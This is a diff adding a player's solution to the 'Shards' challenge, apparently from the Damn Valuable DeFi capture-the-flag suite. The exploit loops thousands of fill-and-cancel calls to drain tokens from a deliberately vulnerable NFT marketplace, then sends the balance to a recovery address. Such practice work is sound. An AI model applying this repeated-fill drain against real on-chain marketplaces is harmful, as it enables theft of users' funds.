@@ -114,7 +114,14 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
+        for(uint i=1 ;i<8000;i++){
+            uint a = marketplace.fill(1, 133);
+            marketplace.cancel(1, a);
+        }
+        DamnValuableToken _token = new DamnValuableToken(); //(i.e to increment nounce)nonce of an address is only updated if that address is used to deploy a contract but not for calling functions
+        token.transfer(recovery, token.balanceOf(player));
         
+
     }
 
     /**
